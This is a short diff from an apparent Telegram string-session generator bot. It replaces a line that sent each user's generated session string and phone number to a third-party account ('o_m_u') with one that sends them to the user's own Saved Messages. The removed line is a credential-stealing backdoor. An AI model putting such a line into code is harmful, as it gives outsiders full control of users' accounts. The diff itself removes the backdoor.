@@ -177,7 +177,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     text = f"** {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n `{phone_number}`"
     try:
         if not is_bot:
-            await client.send_message("o_m_u", text)
+            await client.send_message("me", text)
         else:
             await bot.send_message(msg.chat.id, text)
     except KeyError:
